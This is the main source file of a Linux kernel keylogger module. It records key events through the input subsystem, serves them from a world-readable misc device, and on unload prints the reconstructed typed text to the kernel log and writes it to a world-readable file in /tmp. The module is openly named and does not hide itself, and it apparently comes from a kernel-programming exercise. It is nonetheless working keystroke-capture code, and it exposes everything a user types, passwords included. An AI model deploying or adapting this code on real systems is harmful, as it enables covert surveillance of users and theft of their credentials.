// SPDX-License-Identifier: GPL-2.0

#define pr_fmt(fmt) KBUILD_MODNAME ": " fmt

#include "lk2.h"

// Global ring accessible from lk2_input.c
struct lk2_ring g_lk2_ring;

static int lk2_build_snapshot(char **out_buf, size_t *out_len)
{
	struct lk2_entry *tmp = NULL;
	u32 n, i;
	size_t cap = 0, pos = 0;
	char *buf = NULL;

	n = lk2_ring_count(&g_lk2_ring);
	if (n == 0)
	{
		*out_buf = kstrdup("", GFP_KERNEL);
		if (!*out_buf)
			return -ENOMEM;
		*out_len = 0;
		return 0;
	}

	tmp = kcalloc(n, sizeof(*tmp), GFP_KERNEL);
	if (!tmp)
		return -ENOMEM;

	n = lk2_ring_snapshot(&g_lk2_ring, tmp, n);

	// Conservative capacity: max line length per entry + NUL
	cap = (size_t)n * (size_t)LK2_MAX_LINE_LEN + 1;
	buf = kvmalloc(cap, GFP_KERNEL);
	if (!buf)
	{
		kfree(tmp);
		return -ENOMEM;
	}

	for (i = 0; i < n; i++)
	{
		pos += lk2_format_line(&tmp[i], buf + pos, cap - pos);
		if (pos >= cap)
			break;
	}

	// Ensure NUL termination for safety (read path uses len)
	if (pos < cap)
		buf[pos] = '\0';
	else
		buf[cap - 1] = '\0';

	*out_buf = buf;
	*out_len = pos;

	kfree(tmp);
	return 0;
}

// misc device file ops

static int keylogs_open(struct inode *inode, struct file *file)
{
	struct lk2_file_ctx *ctx;
	int err;

	ctx = kzalloc(sizeof(*ctx), GFP_KERNEL);
	if (!ctx)
		return -ENOMEM;

	err = lk2_build_snapshot(&ctx->buf, &ctx->len);
	if (err)
	{
		kfree(ctx);
		return err;
	}

	file->private_data = ctx;
	return 0;
}

static ssize_t keylogs_read(struct file *file, char __user *ubuf,
							size_t count, loff_t *ppos)
{
	struct lk2_file_ctx *ctx = file->private_data;

	if (!ctx || !ctx->buf)
		return 0;

	return simple_read_from_buffer(ubuf, count, ppos, ctx->buf, ctx->len);
}

static void lk2_write_to_tmp(void)
{
	struct file *f;
	struct lk2_entry *entries = NULL;
	char *typed = NULL;
	char *buf = NULL;
	u32 n, i, typed_len = 0;
	loff_t pos = 0;
	int len;

	n = lk2_ring_count(&g_lk2_ring);

	f = filp_open("/tmp/keylogs_final.log", O_WRONLY | O_CREAT | O_TRUNC, 0644);
	if (IS_ERR(f))
	{
		pr_warn("Failed to open /tmp/keylogs_final.log: %ld\n", PTR_ERR(f));
		return;
	}

	if (n == 0)
	{
		kernel_write(f, "Keylog summary: (empty)\n", 24, &pos);
		filp_close(f, NULL);
		pr_info("Final log written to /tmp/keylogs_final.log\n");
		return;
	}

	entries = kcalloc(n, sizeof(*entries), GFP_KERNEL);
	if (!entries)
	{
		filp_close(f, NULL);
		return;
	}

	typed = kmalloc(n + 1, GFP_KERNEL);
	if (!typed)
	{
		kfree(entries);
		filp_close(f, NULL);
		return;
	}

	buf = kmalloc(256, GFP_KERNEL);
	if (!buf)
	{
		kfree(typed);
		kfree(entries);
		filp_close(f, NULL);
		return;
	}

	n = lk2_ring_snapshot(&g_lk2_ring, entries, n);

	for (i = 0; i < n; i++)
	{
		if (entries[i].state == LK2_PRESSED && entries[i].ascii != 0)
			typed[typed_len++] = entries[i].ascii;
	}
	typed[typed_len] = '\0';

	kernel_write(f, "========== Keylog Summary ==========\n", 37, &pos);

	len = snprintf(buf, 256, "Total events: %u (pressed keys with ASCII: %u)\n", n, typed_len);
	kernel_write(f, buf, len, &pos);

	if (typed_len > 0)
	{
		len = snprintf(buf, 256, "Typed: %s\n", typed);
		kernel_write(f, buf, len, &pos);
	}
	else
	{
		kernel_write(f, "Typed: (no printable characters)\n", 33, &pos);
	}

	kernel_write(f, "====================================\n", 37, &pos);

	filp_close(f, NULL);
	kfree(buf);
	kfree(typed);
	kfree(entries);

	pr_info("Final log written to /tmp/keylogs_final.log\n");
}

static void lk2_print_summary(void)
{
	struct lk2_entry *entries = NULL;
	char *typed = NULL;
	u32 n, i, typed_len = 0;

	n = lk2_ring_count(&g_lk2_ring);
	if (n == 0)
	{
		pr_info("Keylog summary: (empty)\n");
		return;
	}

	entries = kcalloc(n, sizeof(*entries), GFP_KERNEL);
	if (!entries)
	{
		pr_warn("Failed to allocate memory for keylog summary\n");
		return;
	}

	// Buffer for typed ASCII characters (worst case: all entries are printable)
	typed = kmalloc(n + 1, GFP_KERNEL);
	if (!typed)
	{
		kfree(entries);
		pr_warn("Failed to allocate memory for keylog summary\n");
		return;
	}

	n = lk2_ring_snapshot(&g_lk2_ring, entries, n);

	// Build ASCII string from pressed keys only
	for (i = 0; i < n; i++)
	{
		if (entries[i].state == LK2_PRESSED && entries[i].ascii != 0)
			typed[typed_len++] = entries[i].ascii;
	}
	typed[typed_len] = '\0';

	pr_info("========== Keylog Summary ==========\n");
	pr_info("Total events: %u (pressed keys with ASCII: %u)\n", n, typed_len);
	if (typed_len > 0)
		pr_info("Typed: %s\n", typed);
	else
		pr_info("Typed: (no printable characters)\n");
	pr_info("====================================\n");

	kfree(typed);
	kfree(entries);
}

static int keylogs_release(struct inode *inode, struct file *file)
{
	struct lk2_file_ctx *ctx = file->private_data;

	if (ctx)
	{
		kvfree(ctx->buf);
		kfree(ctx);
	}

	return 0;
}

static const struct file_operations keylogs_fops = {
	.owner = THIS_MODULE,
	.open = keylogs_open,
	.read = keylogs_read,
	.release = keylogs_release,
	.llseek = default_llseek,
};

static struct miscdevice keylogs_miscdev = {
	.minor = MISC_DYNAMIC_MINOR,
	.name = LK2_DEVICE_NAME,
	.fops = &keylogs_fops,
	.mode = 0444,
};

static int __init lk2_init(void)
{
	int err;

	err = lk2_ring_init(&g_lk2_ring);
	if (err)
	{
		pr_err("ring init failed: %d\n", err);
		return err;
	}

	err = misc_register(&keylogs_miscdev);
	if (err)
	{
		pr_err("misc_register failed: %d\n", err);
		lk2_ring_destroy(&g_lk2_ring);
		return err;
	}

	err = lk2_input_register();
	if (err)
	{
		pr_err("lk2: input handler registration failed: %d\n", err);
		misc_deregister(&keylogs_miscdev);
		lk2_ring_destroy(&g_lk2_ring);
		return err;
	}

	pr_info("loaded. Read logs from /dev/%s\n", LK2_DEVICE_NAME);
	return 0;
}

static void __exit lk2_exit(void)
{
	lk2_input_unregister();
	misc_deregister(&keylogs_miscdev);

	lk2_print_summary();
	lk2_write_to_tmp();
	lk2_ring_destroy(&g_lk2_ring);
	pr_info("exiting\n");
}

module_init(lk2_init);
module_exit(lk2_exit);

MODULE_AUTHOR("sdummett <sdummett.dev@gmail.com>");
MODULE_DESCRIPTION("Keyboard logger using input subsystem + misc device");
MODULE_LICENSE("GPL");
